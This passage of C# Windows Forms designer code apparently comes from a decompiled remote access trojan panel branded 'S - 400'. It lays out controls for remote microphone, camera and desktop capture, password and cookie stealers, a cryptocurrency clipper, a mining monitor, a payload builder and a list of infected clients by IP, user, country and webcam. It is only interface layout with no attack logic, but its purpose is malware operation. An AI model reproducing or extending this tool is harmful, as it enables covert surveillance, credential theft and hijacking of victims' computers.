		LOGRERR.UncheckedState.BorderThickness = 0;
		LOGRERR.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		LOGRERR.UseVisualStyleBackColor = false;
		LOGCONNECTIONS.AutoSize = true;
		LOGCONNECTIONS.BackColor = Color.FromArgb(37, 42, 64);
		LOGCONNECTIONS.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		LOGCONNECTIONS.CheckedState.BorderRadius = 20;
		LOGCONNECTIONS.CheckedState.BorderThickness = 2;
		LOGCONNECTIONS.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		LOGCONNECTIONS.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		LOGCONNECTIONS.ForeColor = Color.White;
		LOGCONNECTIONS.Location = new Point(18, 65);
		LOGCONNECTIONS.Name = "LOGCONNECTIONS";
		LOGCONNECTIONS.Size = new Size(92, 19);
		LOGCONNECTIONS.TabIndex = 105;
		LOGCONNECTIONS.Text = "Connections";
		LOGCONNECTIONS.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		LOGCONNECTIONS.UncheckedState.BorderRadius = 0;
		LOGCONNECTIONS.UncheckedState.BorderThickness = 0;
		LOGCONNECTIONS.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		LOGCONNECTIONS.UseVisualStyleBackColor = false;
		LOGLOGIN.AutoSize = true;
		LOGLOGIN.BackColor = Color.FromArgb(37, 42, 64);
		LOGLOGIN.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		LOGLOGIN.CheckedState.BorderRadius = 20;
		LOGLOGIN.CheckedState.BorderThickness = 2;
		LOGLOGIN.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		LOGLOGIN.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		LOGLOGIN.ForeColor = Color.White;
		LOGLOGIN.Location = new Point(18, 37);
		LOGLOGIN.Name = "LOGLOGIN";
		LOGLOGIN.Size = new Size(93, 19);
		LOGLOGIN.TabIndex = 104;
		LOGLOGIN.Text = "Login  -  Out";
		LOGLOGIN.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		LOGLOGIN.UncheckedState.BorderRadius = 0;
		LOGLOGIN.UncheckedState.BorderThickness = 0;
		LOGLOGIN.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		LOGLOGIN.UseVisualStyleBackColor = false;
		PictureBox18.Image = (Image)componentResourceManager.GetObject("PictureBox18.Image");
		PictureBox18.Location = new Point(238, 6);
		PictureBox18.Name = "PictureBox18";
		PictureBox18.Size = new Size(48, 30);
		PictureBox18.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox18.TabIndex = 76;
		PictureBox18.TabStop = false;
		Label38.AutoSize = true;
		Label38.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label38.ForeColor = Color.White;
		Label38.Location = new Point(3, 6);
		Label38.Name = "Label38";
		Label38.Size = new Size(36, 17);
		Label38.TabIndex = 1;
		Label38.Text = "Logs";
		Panel25.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
		Panel25.BackColor = Color.FromArgb(37, 42, 64);
		Panel25.Controls.Add(MICAUT);
		Panel25.Controls.Add(PictureBox4);
		Panel25.Controls.Add(MICI);
		Panel25.Controls.Add(Label36);
		Panel25.ForeColor = Color.FromArgb(37, 42, 64);
		Panel25.Location = new Point(158, 268);
		Panel25.Name = "Panel25";
		Panel25.Size = new Size(286, 117);
		Panel25.TabIndex = 115;
		MICAUT.AutoSize = true;
		MICAUT.BackColor = Color.FromArgb(37, 42, 64);
		MICAUT.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		MICAUT.CheckedState.BorderRadius = 20;
		MICAUT.CheckedState.BorderThickness = 2;
		MICAUT.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		MICAUT.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		MICAUT.ForeColor = Color.White;
		MICAUT.Location = new Point(18, 37);
		MICAUT.Name = "MICAUT";
		MICAUT.Size = new Size(77, 19);
		MICAUT.TabIndex = 104;
		MICAUT.Text = "AutoStart";
		MICAUT.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		MICAUT.UncheckedState.BorderRadius = 0;
		MICAUT.UncheckedState.BorderThickness = 0;
		MICAUT.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		MICAUT.UseVisualStyleBackColor = false;
		PictureBox4.Image = (Image)componentResourceManager.GetObject("PictureBox4.Image");
		PictureBox4.Location = new Point(235, 9);
		PictureBox4.Name = "PictureBox4";
		PictureBox4.Size = new Size(48, 30);
		PictureBox4.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox4.TabIndex = 76;
		PictureBox4.TabStop = false;
		MICI.Animated = true;
		MICI.AutoRoundedCorners = true;
		MICI.BackColor = Color.FromArgb(37, 42, 64);
		MICI.BorderColor = Color.FromArgb(0, 126, 249);
		MICI.BorderRadius = 17;
		MICI.DrawMode = DrawMode.OwnerDrawFixed;
		MICI.DropDownStyle = ComboBoxStyle.DropDownList;
		MICI.FillColor = Color.FromArgb(37, 42, 64);
		MICI.FocusedColor = Color.FromArgb(94, 148, 255);
		MICI.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		MICI.FocusedState.Parent = MICI;
		MICI.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		MICI.ForeColor = Color.FromArgb(0, 192, 192);
		MICI.HoverState.Parent = MICI;
		MICI.ItemHeight = 30;
		MICI.Items.AddRange(new object[8] { "4 kb 8bit", "6 kb 8bit", "8 kb 8bit", "8 kb 16bit", "12 kb 16bit", "16 kb 16bit", "20 kb 16bit", "24 kb 16bit" });
		MICI.ItemsAppearance.Parent = MICI;
		MICI.Location = new Point(18, 72);
		MICI.Name = "MICI";
		MICI.ShadowDecoration.Parent = MICI;
		MICI.Size = new Size(143, 36);
		MICI.Style = TextBoxStyle.Material;
		MICI.TabIndex = 105;
		Label36.AutoSize = true;
		Label36.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label36.ForeColor = Color.White;
		Label36.Location = new Point(3, 6);
		Label36.Name = "Label36";
		Label36.Size = new Size(78, 17);
		Label36.TabIndex = 1;
		Label36.Text = "Remote Mic";
		Panel5.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
		Panel5.BackColor = Color.FromArgb(37, 42, 64);
		Panel5.Controls.Add(CAMAUT);
		Panel5.Controls.Add(PictureBox3);
		Panel5.Controls.Add(CAMI);
		Panel5.Controls.Add(Label35);
		Panel5.ForeColor = Color.FromArgb(37, 42, 64);
		Panel5.Location = new Point(158, 144);
		Panel5.Name = "Panel5";
		Panel5.Size = new Size(286, 118);
		Panel5.TabIndex = 114;
		CAMAUT.AutoSize = true;
		CAMAUT.BackColor = Color.FromArgb(37, 42, 64);
		CAMAUT.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		CAMAUT.CheckedState.BorderRadius = 20;
		CAMAUT.CheckedState.BorderThickness = 2;
		CAMAUT.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		CAMAUT.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		CAMAUT.ForeColor = Color.White;
		CAMAUT.Location = new Point(18, 37);
		CAMAUT.Name = "CAMAUT";
		CAMAUT.Size = new Size(77, 19);
		CAMAUT.TabIndex = 104;
		CAMAUT.Text = "AutoStart";
		CAMAUT.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		CAMAUT.UncheckedState.BorderRadius = 0;
		CAMAUT.UncheckedState.BorderThickness = 0;
		CAMAUT.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		CAMAUT.UseVisualStyleBackColor = false;
		PictureBox3.Image = (Image)componentResourceManager.GetObject("PictureBox3.Image");
		PictureBox3.Location = new Point(235, 6);
		PictureBox3.Name = "PictureBox3";
		PictureBox3.Size = new Size(48, 30);
		PictureBox3.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox3.TabIndex = 76;
		PictureBox3.TabStop = false;
		CAMI.Animated = true;
		CAMI.AutoRoundedCorners = true;
		CAMI.BackColor = Color.FromArgb(37, 42, 64);
		CAMI.BorderColor = Color.FromArgb(0, 126, 249);
		CAMI.BorderRadius = 17;
		CAMI.DrawMode = DrawMode.OwnerDrawFixed;
		CAMI.DropDownStyle = ComboBoxStyle.DropDownList;
		CAMI.FillColor = Color.FromArgb(37, 42, 64);
		CAMI.FocusedColor = Color.FromArgb(94, 148, 255);
		CAMI.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		CAMI.FocusedState.Parent = CAMI;
		CAMI.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		CAMI.ForeColor = Color.FromArgb(0, 192, 192);
		CAMI.HoverState.Parent = CAMI;
		CAMI.ItemHeight = 30;
		CAMI.Items.AddRange(new object[11]
		{
			"%100", "%95", "%90", "%85", "%80", "%75", "%70", "%65", "%60", "%55",
			"%50"
		});
		CAMI.ItemsAppearance.Parent = CAMI;
		CAMI.Location = new Point(18, 70);
		CAMI.Name = "CAMI";
		CAMI.ShadowDecoration.Parent = CAMI;
		CAMI.Size = new Size(254, 36);
		CAMI.Style = TextBoxStyle.Material;
		CAMI.TabIndex = 105;
		Label35.AutoSize = true;
		Label35.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label35.ForeColor = Color.White;
		Label35.Location = new Point(3, 6);
		Label35.Name = "Label35";
		Label35.Size = new Size(83, 17);
		Label35.TabIndex = 1;
		Label35.Text = "Remote Cam";
		Panel3.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
		Panel3.BackColor = Color.FromArgb(37, 42, 64);
		Panel3.Controls.Add(SCAUT);
		Panel3.Controls.Add(PictureBox2);
		Panel3.Controls.Add(SCI);
		Panel3.Controls.Add(Label34);
		Panel3.ForeColor = Color.FromArgb(37, 42, 64);
		Panel3.Location = new Point(158, 24);
		Panel3.Name = "Panel3";
		Panel3.Size = new Size(286, 114);
		Panel3.TabIndex = 113;
		SCAUT.AutoSize = true;
		SCAUT.BackColor = Color.FromArgb(37, 42, 64);
		SCAUT.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		SCAUT.CheckedState.BorderRadius = 20;
		SCAUT.CheckedState.BorderThickness = 2;
		SCAUT.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		SCAUT.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		SCAUT.ForeColor = Color.White;
		SCAUT.Location = new Point(18, 37);
		SCAUT.Name = "SCAUT";
		SCAUT.Size = new Size(77, 19);
		SCAUT.TabIndex = 104;
		SCAUT.Text = "AutoStart";
		SCAUT.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		SCAUT.UncheckedState.BorderRadius = 0;
		SCAUT.UncheckedState.BorderThickness = 0;
		SCAUT.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		SCAUT.UseVisualStyleBackColor = false;
		PictureBox2.Image = (Image)componentResourceManager.GetObject("PictureBox2.Image");
		PictureBox2.Location = new Point(235, 6);
		PictureBox2.Name = "PictureBox2";
		PictureBox2.Size = new Size(48, 30);
		PictureBox2.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox2.TabIndex = 76;
		PictureBox2.TabStop = false;
		SCI.Animated = true;
		SCI.AutoRoundedCorners = true;
		SCI.BackColor = Color.FromArgb(37, 42, 64);
		SCI.BorderColor = Color.FromArgb(0, 126, 249);
		SCI.BorderRadius = 17;
		SCI.DrawMode = DrawMode.OwnerDrawFixed;
		SCI.DropDownStyle = ComboBoxStyle.DropDownList;
		SCI.FillColor = Color.FromArgb(37, 42, 64);
		SCI.FocusedColor = Color.FromArgb(94, 148, 255);
		SCI.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		SCI.FocusedState.Parent = SCI;
		SCI.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		SCI.ForeColor = Color.FromArgb(0, 192, 192);
		SCI.HoverState.Parent = SCI;
		SCI.ItemHeight = 30;
		SCI.Items.AddRange(new object[11]
		{
			"%100", "%95", "%90", "%85", "%80", "%75", "%70", "%65", "%60", "%55",
			"%50"
		});
		SCI.ItemsAppearance.Parent = SCI;
		SCI.Location = new Point(18, 70);
		SCI.Name = "SCI";
		SCI.ShadowDecoration.Parent = SCI;
		SCI.Size = new Size(254, 36);
		SCI.Style = TextBoxStyle.Material;
		SCI.TabIndex = 105;
		Label34.AutoSize = true;
		Label34.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label34.ForeColor = Color.White;
		Label34.Location = new Point(3, 6);
		Label34.Name = "Label34";
		Label34.Size = new Size(105, 17);
		Label34.TabIndex = 1;
		Label34.Text = "Remote Desktop";
		Abouts.BackColor = Color.FromArgb(46, 51, 73);
		Abouts.Controls.Add(Button12);
		Abouts.Controls.Add(Button11);
		Abouts.Controls.Add(PictureBox98);
		Abouts.Location = new Point(4, 22);
		Abouts.Name = "Abouts";
		Abouts.Padding = new Padding(3);
		Abouts.Size = new Size(925, 457);
		Abouts.TabIndex = 9;
		Abouts.Text = "About";
		Button12.BackColor = Color.FromArgb(24, 30, 54);
		Button12.FlatStyle = FlatStyle.Popup;
		Button12.ForeColor = Color.White;
		Button12.Location = new Point(8, 417);
		Button12.Name = "Button12";
		Button12.Size = new Size(75, 23);
		Button12.TabIndex = 3;
		Button12.Text = "YouTube";
		Button12.UseVisualStyleBackColor = false;
		Button11.BackColor = Color.FromArgb(24, 30, 54);
		Button11.FlatStyle = FlatStyle.Popup;
		Button11.ForeColor = Color.White;
		Button11.Location = new Point(89, 417);
		Button11.Name = "Button11";
		Button11.Size = new Size(75, 23);
		Button11.TabIndex = 2;
		Button11.Text = "Telegram";
		Button11.UseVisualStyleBackColor = false;
		PictureBox98.Dock = DockStyle.Fill;
		PictureBox98.Image = (Image)componentResourceManager.GetObject("PictureBox98.Image");
		PictureBox98.Location = new Point(3, 3);
		PictureBox98.Name = "PictureBox98";
		PictureBox98.Size = new Size(919, 451);
		PictureBox98.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox98.TabIndex = 1;
		PictureBox98.TabStop = false;
		Panel7.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		Panel7.BackColor = Color.FromArgb(46, 51, 73);
		Panel7.Location = new Point(184, 65);
		Panel7.Name = "Panel7";
		Panel7.Size = new Size(1064, 35);
		Panel7.TabIndex = 39;
		panel1.BackColor = Color.FromArgb(24, 30, 54);
		panel1.Controls.Add(pnlNav);
		panel1.Controls.Add(NOTF_COK);
		panel1.Controls.Add(NOTF_BRBS1);
		panel1.Controls.Add(NOTF_L1_Miner);
		panel1.Controls.Add(Notf_pass);
		panel1.Controls.Add(Button10);
		panel1.Controls.Add(Button9);
		panel1.Controls.Add(Button8);
		panel1.Controls.Add(NONN);
		panel1.Controls.Add(Settings6);
		panel1.Controls.Add(Toolbox5);
		panel1.Controls.Add(About);
		panel1.Controls.Add(Logis4);
		panel1.Controls.Add(Builder3);
		panel1.Controls.Add(Client2);
		panel1.Controls.Add(Home1);
		panel1.Controls.Add(panel2);
		panel1.Dock = DockStyle.Left;
		panel1.Location = new Point(0, 0);
		panel1.Name = "panel1";
		panel1.Size = new Size(186, 548);
		panel1.TabIndex = 40;
		pnlNav.BackColor = Color.FromArgb(0, 126, 249);
		pnlNav.Location = new Point(0, 141);
		pnlNav.Name = "pnlNav";
		pnlNav.Size = new Size(3, 100);
		pnlNav.TabIndex = 136;
		NOTF_COK.Animated = true;
		NOTF_COK.AutoRoundedCorners = true;
		NOTF_COK.BackColor = Color.Transparent;
		NOTF_COK.BorderRadius = 4;
		NOTF_COK.CheckedState.Parent = NOTF_COK;
		NOTF_COK.CustomImages.Parent = NOTF_COK;
		NOTF_COK.FillColor = Color.Red;
		NOTF_COK.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		NOTF_COK.ForeColor = Color.FromArgb(255, 194, 10);
		NOTF_COK.HoverState.Parent = NOTF_COK;
		NOTF_COK.IndicateFocus = true;
		NOTF_COK.Location = new Point(172, 401);
		NOTF_COK.Name = "NOTF_COK";
		NOTF_COK.ShadowDecoration.Parent = NOTF_COK;
		NOTF_COK.Size = new Size(10, 10);
		NOTF_COK.TabIndex = 119;
		NOTF_COK.UseTransparentBackground = true;
		NOTF_COK.Visible = false;
		NOTF_BRBS1.Animated = true;
		NOTF_BRBS1.AutoRoundedCorners = true;
		NOTF_BRBS1.BorderRadius = 4;
		NOTF_BRBS1.CheckedState.Parent = NOTF_BRBS1;
		NOTF_BRBS1.CustomImages.Parent = NOTF_BRBS1;
		NOTF_BRBS1.FillColor = Color.Red;
		NOTF_BRBS1.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		NOTF_BRBS1.ForeColor = Color.FromArgb(255, 194, 10);
		NOTF_BRBS1.HoverState.Parent = NOTF_BRBS1;
		NOTF_BRBS1.IndicateFocus = true;
		NOTF_BRBS1.Location = new Point(172, 355);
		NOTF_BRBS1.Name = "NOTF_BRBS1";
		NOTF_BRBS1.ShadowDecoration.Parent = NOTF_BRBS1;
		NOTF_BRBS1.Size = new Size(10, 10);
		NOTF_BRBS1.TabIndex = 118;
		NOTF_BRBS1.Text = "0";
		NOTF_BRBS1.Visible = false;
		NOTF_L1_Miner.Animated = true;
		NOTF_L1_Miner.AutoRoundedCorners = true;
		NOTF_L1_Miner.BorderRadius = 4;
		NOTF_L1_Miner.CheckedState.Parent = NOTF_L1_Miner;
		NOTF_L1_Miner.CustomImages.Parent = NOTF_L1_Miner;
		NOTF_L1_Miner.FillColor = Color.Red;
		NOTF_L1_Miner.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		NOTF_L1_Miner.ForeColor = Color.FromArgb(255, 194, 10);
		NOTF_L1_Miner.HoverState.Parent = NOTF_L1_Miner;
		NOTF_L1_Miner.IndicateFocus = true;
		NOTF_L1_Miner.Location = new Point(172, 320);
		NOTF_L1_Miner.Name = "NOTF_L1_Miner";
		NOTF_L1_Miner.ShadowDecoration.Parent = NOTF_L1_Miner;
		NOTF_L1_Miner.Size = new Size(10, 10);
		NOTF_L1_Miner.TabIndex = 117;
		NOTF_L1_Miner.Text = "0";
		NOTF_L1_Miner.Visible = false;
		Notf_pass.Animated = true;
		Notf_pass.AutoRoundedCorners = true;
		Notf_pass.BackColor = Color.Transparent;
		Notf_pass.BorderRadius = 4;
		Notf_pass.CheckedState.Parent = Notf_pass;
		Notf_pass.CustomImages.Parent = Notf_pass;
		Notf_pass.FillColor = Color.Red;
		Notf_pass.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Notf_pass.ForeColor = Color.FromArgb(255, 194, 10);
		Notf_pass.HoverState.Parent = Notf_pass;
		Notf_pass.IndicateFocus = true;
		Notf_pass.Location = new Point(165, 288);
		Notf_pass.Name = "Notf_pass";
		Notf_pass.ShadowDecoration.Parent = Notf_pass;
		Notf_pass.Size = new Size(11, 11);
		Notf_pass.TabIndex = 117;
		Notf_pass.UseTransparentBackground = true;
		Notf_pass.Visible = false;
		Button10.Dock = DockStyle.Top;
		Button10.FlatAppearance.BorderSize = 0;
		Button10.FlatStyle = FlatStyle.Flat;
		Button10.Font = new Font("Nirmala UI", 9.75f, FontStyle.Bold);
		Button10.ForeColor = Color.FromArgb(0, 126, 249);
		Button10.Image = (Image)componentResourceManager.GetObject("Button10.Image");
		Button10.ImageAlign = ContentAlignment.MiddleRight;
		Button10.Location = new Point(0, 437);
		Button10.Name = "Button10";
		Button10.Size = new Size(186, 42);
		Button10.TabIndex = 76;
		Button10.Text = "   Settings     ";
		Button10.TextAlign = ContentAlignment.MiddleLeft;
		Button10.TextImageRelation = TextImageRelation.TextBeforeImage;
		Button10.UseVisualStyleBackColor = true;
		Button9.Dock = DockStyle.Top;
		Button9.FlatAppearance.BorderSize = 0;
		Button9.FlatStyle = FlatStyle.Flat;
		Button9.Font = new Font("Nirmala UI", 9.75f, FontStyle.Bold);
		Button9.ForeColor = Color.FromArgb(0, 126, 249);
		Button9.Image = (Image)componentResourceManager.GetObject("Button9.Image");
		Button9.ImageAlign = ContentAlignment.MiddleRight;
		Button9.Location = new Point(0, 395);
		Button9.Name = "Button9";
		Button9.Size = new Size(186, 42);
		Button9.TabIndex = 75;
		Button9.Text = "   Cookies Stealer";
		Button9.TextAlign = ContentAlignment.MiddleLeft;
		Button9.TextImageRelation = TextImageRelation.TextBeforeImage;
		Button9.UseVisualStyleBackColor = true;
		Button8.Dock = DockStyle.Top;
		Button8.FlatAppearance.BorderSize = 0;
		Button8.FlatStyle = FlatStyle.Flat;
		Button8.Font = new Font("Nirmala UI", 9.75f, FontStyle.Bold);
		Button8.ForeColor = Color.FromArgb(0, 126, 249);
		Button8.Image = (Image)componentResourceManager.GetObject("Button8.Image");
		Button8.ImageAlign = ContentAlignment.MiddleRight;
		Button8.Location = new Point(0, 353);
		Button8.Name = "Button8";
		Button8.Size = new Size(186, 42);
		Button8.TabIndex = 74;
		Button8.Text = "   Currency Clipper";
		Button8.TextAlign = ContentAlignment.MiddleLeft;
		Button8.TextImageRelation = TextImageRelation.TextBeforeImage;
		Button8.UseVisualStyleBackColor = true;
		NONN.Animated = true;
		NONN.AutoRoundedCorners = true;
		NONN.BackColor = Color.Transparent;
		NONN.BorderRadius = 4;
		NONN.CheckedState.Parent = NONN;
		NONN.CustomImages.Parent = NONN;
		NONN.FillColor = Color.Red;
		NONN.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		NONN.ForeColor = Color.FromArgb(255, 194, 10);
		NONN.HoverState.Parent = NONN;
		NONN.IndicateFocus = true;
		NONN.Location = new Point(165, 244);
		NONN.Name = "NONN";
		NONN.ShadowDecoration.Parent = NONN;
		NONN.Size = new Size(10, 10);
		NONN.TabIndex = 73;
		NONN.UseTransparentBackground = true;
		NONN.Visible = false;
		Settings6.Dock = DockStyle.Top;
		Settings6.FlatAppearance.BorderSize = 0;
		Settings6.FlatStyle = FlatStyle.Flat;
		Settings6.Font = new Font("Nirmala UI", 9.75f, FontStyle.Bold);
		Settings6.ForeColor = Color.FromArgb(0, 126, 249);
		Settings6.Image = (Image)componentResourceManager.GetObject("Settings6.Image");
		Settings6.ImageAlign = ContentAlignment.MiddleRight;
		Settings6.Location = new Point(0, 311);
		Settings6.Name = "Settings6";
		Settings6.Size = new Size(186, 42);
		Settings6.TabIndex = 4;
		Settings6.Text = "   Mining Monitor";
		Settings6.TextAlign = ContentAlignment.MiddleLeft;
		Settings6.TextImageRelation = TextImageRelation.TextBeforeImage;
		Settings6.UseVisualStyleBackColor = true;
		Toolbox5.Dock = DockStyle.Top;
		Toolbox5.FlatAppearance.BorderSize = 0;
		Toolbox5.FlatStyle = FlatStyle.Flat;
		Toolbox5.Font = new Font("Nirmala UI", 9.75f, FontStyle.Bold);
		Toolbox5.ForeColor = Color.FromArgb(0, 126, 249);
		Toolbox5.Image = (Image)componentResourceManager.GetObject("Toolbox5.Image");
		Toolbox5.ImageAlign = ContentAlignment.MiddleRight;
		Toolbox5.Location = new Point(0, 269);
		Toolbox5.Name = "Toolbox5";
		Toolbox5.Size = new Size(186, 42);
		Toolbox5.TabIndex = 3;
		Toolbox5.Text = "   Passwords Stealer";
		Toolbox5.TextAlign = ContentAlignment.MiddleLeft;
		Toolbox5.TextImageRelation = TextImageRelation.TextBeforeImage;
		Toolbox5.UseVisualStyleBackColor = true;
		About.Dock = DockStyle.Bottom;
		About.FlatAppearance.BorderSize = 0;
		About.FlatStyle = FlatStyle.Flat;
		About.Font = new Font("Nirmala UI", 9.75f, FontStyle.Bold);
		About.ForeColor = Color.FromArgb(0, 126, 249);
		About.Image = (Image)componentResourceManager.GetObject("About.Image");
		About.ImageAlign = ContentAlignment.MiddleRight;
		About.Location = new Point(0, 506);
		About.Name = "About";
		About.Size = new Size(186, 42);
		About.TabIndex = 1;
		About.Text = "   About";
		About.TextAlign = ContentAlignment.MiddleLeft;
		About.TextImageRelation = TextImageRelation.TextBeforeImage;
		About.UseVisualStyleBackColor = true;
		Logis4.Dock = DockStyle.Top;
		Logis4.FlatAppearance.BorderSize = 0;
		Logis4.FlatStyle = FlatStyle.Flat;
		Logis4.Font = new Font("Nirmala UI", 9.75f, FontStyle.Bold);
		Logis4.ForeColor = Color.FromArgb(0, 126, 249);
		Logis4.Image = (Image)componentResourceManager.GetObject("Logis4.Image");
		Logis4.ImageAlign = ContentAlignment.MiddleRight;
		Logis4.Location = new Point(0, 227);
		Logis4.Name = "Logis4";
		Logis4.Size = new Size(186, 42);
		Logis4.TabIndex = 1;
		Logis4.Text = "   Monitor Client";
		Logis4.TextAlign = ContentAlignment.MiddleLeft;
		Logis4.TextImageRelation = TextImageRelation.TextBeforeImage;
		Logis4.UseVisualStyleBackColor = true;
		Builder3.Dock = DockStyle.Top;
		Builder3.FlatAppearance.BorderSize = 0;
		Builder3.FlatStyle = FlatStyle.Flat;
		Builder3.Font = new Font("Nirmala UI", 9.75f, FontStyle.Bold);
		Builder3.ForeColor = Color.FromArgb(0, 126, 249);
		Builder3.Image = (Image)componentResourceManager.GetObject("Builder3.Image");
		Builder3.ImageAlign = ContentAlignment.MiddleRight;
		Builder3.Location = new Point(0, 185);
		Builder3.Name = "Builder3";
		Builder3.Size = new Size(186, 42);
		Builder3.TabIndex = 1;
		Builder3.Text = "   Builder ";
		Builder3.TextAlign = ContentAlignment.MiddleLeft;
		Builder3.TextImageRelation = TextImageRelation.TextBeforeImage;
		Builder3.UseVisualStyleBackColor = true;
		Client2.Dock = DockStyle.Top;
		Client2.FlatAppearance.BorderSize = 0;
		Client2.FlatStyle = FlatStyle.Flat;
		Client2.Font = new Font("Nirmala UI", 9.75f, FontStyle.Bold);
		Client2.ForeColor = Color.FromArgb(0, 126, 249);
		Client2.Image = (Image)componentResourceManager.GetObject("Client2.Image");
		Client2.ImageAlign = ContentAlignment.MiddleRight;
		Client2.Location = new Point(0, 143);
		Client2.Name = "Client2";
		Client2.Size = new Size(186, 42);
		Client2.TabIndex = 1;
		Client2.Text = "   Client    ";
		Client2.TextAlign = ContentAlignment.MiddleLeft;
		Client2.TextImageRelation = TextImageRelation.TextBeforeImage;
		Client2.UseVisualStyleBackColor = true;
		Home1.Dock = DockStyle.Top;
		Home1.FlatAppearance.BorderSize = 0;
		Home1.FlatStyle = FlatStyle.Flat;
		Home1.Font = new Font("Nirmala UI", 9.75f, FontStyle.Bold);
		Home1.ForeColor = Color.FromArgb(0, 126, 249);
		Home1.Image = (Image)componentResourceManager.GetObject("Home1.Image");
		Home1.ImageAlign = ContentAlignment.MiddleRight;
		Home1.Location = new Point(0, 101);
		Home1.Name = "Home1";
		Home1.Size = new Size(186, 42);
		Home1.TabIndex = 1;
		Home1.Text = "   Home   ";
		Home1.TextAlign = ContentAlignment.MiddleLeft;
		Home1.TextImageRelation = TextImageRelation.TextBeforeImage;
		Home1.UseVisualStyleBackColor = true;
		panel2.Controls.Add(Label8);
		panel2.Controls.Add(pictureBox1);
		panel2.Dock = DockStyle.Top;
		panel2.Location = new Point(0, 0);
		panel2.Name = "panel2";
		panel2.Size = new Size(186, 101);
		panel2.TabIndex = 0;
		Label8.AutoSize = true;
		Label8.Font = new Font("Microsoft Sans Serif", 15.75f);
		Label8.ForeColor = Color.FromArgb(213, 218, 223);
		Label8.Location = new Point(56, 120);
		Label8.Name = "Label8";
		Label8.Size = new Size(81, 25);
		Label8.TabIndex = 41;
		Label8.Text = "S - 400";
		pictureBox1.Image = (Image)componentResourceManager.GetObject("pictureBox1.Image");
		pictureBox1.Location = new Point(0, 0);
		pictureBox1.Name = "pictureBox1";
		pictureBox1.Size = new Size(186, 98);
		pictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
		pictureBox1.TabIndex = 0;
		pictureBox1.TabStop = false;
		vmethod_20().Text = "Nome";
		vmethod_20().Width = 70;
		vmethod_22().Text = "IP/Host";
		vmethod_22().Width = 49;
		vmethod_24().Text = "PC";
		vmethod_24().Width = 42;
		vmethod_26().Text = "Usuário";
		vmethod_26().Width = 53;
		vmethod_28().Text = "Data de Instalação";
		vmethod_28().Width = 107;
		vmethod_30().Text = "País";
		vmethod_30().Width = 64;
		vmethod_32().Text = "Sistema Operacional";
		sAdrwXngcsy().Text = "Webcam";
		vmethod_35().Text = "Versão";
		vmethod_37().Text = "Ping";
		vmethod_39().Text = "Janelas";
		vmethod_39().Width = 76;
		vmethod_41().Text = "Nome";
		vmethod_41().Width = 70;
		vmethod_43().Text = "IP/Host";
		vmethod_43().Width = 49;
		vmethod_45().Text = "PC";
		vmethod_45().Width = 42;
		vmethod_46().Text = "Usuário";
		vmethod_46().Width = 53;
		vmethod_48().Text = "Data de Instalação";
		vmethod_48().Width = 107;
		vmethod_50().Text = "País";
		vmethod_50().Width = 64;
		vmethod_52().Text = "Sistema Operacional";
		vmethod_54().Text = "Webcam";
		vmethod_56().Text = "Versão";
		vmethod_58().Text = "Ping";
		vmethod_60().Text = "Janelas";
		vmethod_60().Width = 76;
		Control.BackColor = Color.FromArgb(24, 30, 54);
		Control.BackgroundImageLayout = ImageLayout.None;
		Control.Items.AddRange(new ToolStripItem[1] { MyComputerToolStripMenuItem });
		Control.LayoutStyle = ToolStripLayoutStyle.Table;
		Control.Name = "Control";
		Control.RenderStyle.ArrowColor = Color.FromArgb(151, 143, 255);
		Control.RenderStyle.BorderColor = Color.Gainsboro;
		Control.RenderStyle.ColorTable = null;
		Control.RenderStyle.RoundedEdges = true;
		Control.RenderStyle.SelectionArrowColor = Color.MistyRose;
